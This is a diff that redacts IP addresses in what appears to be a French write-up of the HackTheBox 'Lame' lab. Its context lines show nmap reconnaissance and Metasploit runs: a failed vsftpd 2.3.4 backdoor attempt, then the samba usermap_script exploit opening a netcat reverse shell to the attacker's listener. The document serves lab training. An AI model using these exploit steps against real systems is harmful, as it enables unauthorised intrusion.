@@ -146,7 +146,7 @@ Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les por
 
 ```bash
 # Nmap 7.98 scan initiated Wed Feb  4 14:09:53 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt lame.htb
-Nmap scan report for lame.htb (10.129.69.3)
+Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.014s latency).
 Not shown: 65530 filtered tcp ports (no-response)
 PORT     STATE SERVICE
@@ -171,7 +171,7 @@ Dans le cas de lame.htb, cette phase est effectivement exécutée, puisque le sc
 
 ```bash
 # Nmap 7.98 scan initiated Wed Feb  4 14:10:20 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,139,445 --script=ftp-anon,ftp-syst,smb-os-discovery,smb-enum-shares,smb-enum-users --script-timeout=30s -T4 -oN scans_nmap/enum_ftp_smb_scan.txt lame.htb
-Nmap scan report for lame.htb (10.129.69.3)
+Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.97s latency).
 
 PORT    STATE SERVICE     VERSION
@@ -180,7 +180,7 @@ PORT    STATE SERVICE     VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to 10.10.17.246
+|      Connected to 10.10.x.x
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -313,7 +313,7 @@ Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
     nmap -Pn -A -sV -p"21,22,139,445,3632" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "lame.htb"
 
 # Nmap 7.98 scan initiated Wed Feb  4 14:11:04 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p21,22,139,445,3632 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt lame.htb
-Nmap scan report for lame.htb (10.129.69.3)
+Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.40s latency).
 
 PORT     STATE SERVICE     VERSION
@@ -333,8 +333,8 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 139/tcp)
 HOP RTT       ADDRESS
-1   946.51 ms 10.10.16.1
-2   946.50 ms lame.htb (10.129.69.3)
+1   946.51 ms 10.10.x.x
+2   946.50 ms lame.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Feb  4 14:11:25 2026 -- 1 IP address (1 host up) scanned in 21.71 seconds
@@ -349,7 +349,7 @@ Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).
 
 ```bash
 # Nmap 7.98 scan initiated Wed Feb  4 14:11:25 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,22,139,445,3632 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt lame.htb
-Nmap scan report for lame.htb (10.129.69.3)
+Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.030s latency).
 
 PORT     STATE SERVICE     VERSION
@@ -373,7 +373,7 @@ Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).
 
 ```bash
 # Nmap 7.98 scan initiated Wed Feb  4 14:11:39 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt lame.htb
-Nmap scan report for lame.htb (10.129.69.3)
+Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.57s latency).
 
 PORT      STATE         SERVICE
@@ -638,8 +638,8 @@ Exploit target:
 View the full module info with the info, or info -d command.
 
 msf exploit(unix/ftp/vsftpd_234_backdoor) > run
-[*] 10.129.70.64:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 10.129.70.64:21 - USER: 331 Please specify the password.
+[*] 10.129.x.x:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.129.x.x:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
 msf exploit(unix/ftp/vsftpd_234_backdoor) > 
 ```
@@ -750,7 +750,7 @@ View the full module info with the info, or info -d command.
 msf exploit(multi/samba/usermap_script) > set RHOSTS lame.htb
 RHOSTS => lame.htb
 msf exploit(multi/samba/usermap_script) > set LHOST tun0
-LHOST => 10.10.17.246
+LHOST => 10.10.x.x
 msf exploit(multi/samba/usermap_script) > show options
 
 Module options (exploit/multi/samba/usermap_script):
@@ -775,7 +775,7 @@ Payload options (cmd/unix/reverse_netcat):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  10.10.17.246     yes       The listen address (an interfac
+   LHOST  10.10.x.x     yes       The listen address (an interfac
                                      e may be specified)
    LPORT  4444             yes       The listen port
 
@@ -791,8 +791,8 @@ Exploit target:
 View the full module info with the info, or info -d command.
 
 msf exploit(multi/samba/usermap_script) > run
-[*] Started reverse TCP handler on 10.10.17.246:4444 
-[*] Command shell session 1 opened (10.10.17.246:4444 -> 10.129.70.64:40485) at 2026-02-05 17:26:52 +0100
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.x.x:40485) at 2026-02-05 17:26:52 +0100
 
 
 ```
